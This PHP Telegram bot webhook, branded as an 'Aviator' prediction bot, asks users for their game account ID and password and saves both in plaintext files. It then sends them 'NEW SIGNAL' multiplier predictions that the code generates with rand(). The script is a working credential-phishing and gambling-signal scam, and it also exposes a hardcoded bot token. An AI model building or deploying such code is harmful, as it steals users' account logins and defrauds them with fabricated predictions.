<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// ১. টেলিগ্রাম মেসেজ হ্যান্ডেল করা (ID/PW সংগ্রহ)
if (isset($data['message'])) {
    $text = $data['message']['text'] ?? '';
    $uId = $data['message']['chat']['id'];
    $stepFile = "step_$uId.txt";

    if ($text == "/start") {
        $msg = "🚀 **Welcome to R8rAIHAN Aviator Bot** 🚀\n\n👉 **1: Send Your Game ID / Number:**";
        file_put_contents($stepFile, "waiting_id");
        sendTelegram($botToken, $uId, $msg);
        exit;
    }

    $currentStep = file_exists($stepFile) ? file_get_contents($stepFile) : "";

    if ($currentStep == "waiting_id") {
        file_put_contents("user_$uId.json", json_encode(['id' => $text, 'chat_id' => $uId]));
        file_put_contents($stepFile, "waiting_pw");
        sendTelegram($botToken, $uId, "✅ ID Received!\n\n👉 **2: Send Your Game Password:**");
        exit;
    }

    if ($currentStep == "waiting_pw") {
        $userData = json_decode(file_get_contents("user_$uId.json"), true);
        $userData['pw'] = $text;
        $userData['auth'] = true;
        file_put_contents("user_$uId.json", json_encode($userData));
        unlink($stepFile);
        sendTelegram($botToken, $uId, "✅ **Login Successful!**\nএখন গেম শুরু করুন, অটো সিগন্যাল আসবে।");
        exit;
    }
}

// ২. অটো সিগন্যাল (Extension থেকে আসা ডেটা)
if (isset($data['multiplier'])) {
    $lastVal = floatval($data['multiplier']);
    $files = glob("user_*.json"); // সব রেজিস্টার্ড ইউজারকে খোঁজা

    foreach ($files as $file) {
        $user = json_decode(file_get_contents($file), true);
        if (isset($user['auth']) && $user['auth'] == true) {
            $pred = ($lastVal < 1.8) ? rand(240, 550)/100 : rand(110, 205)/100;
            $signal = "🎯 **NEW SIGNAL**\n📊 Last: {$lastVal}x\n🚀 **Next: " . round($pred, 2) . "x**";
            sendTelegram($botToken, $user['chat_id'], $signal);
        }
    }
}

function sendTelegram($token, $chatId, $msg) {
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=".urlencode($msg)."&parse_mode=Markdown");
}
?>
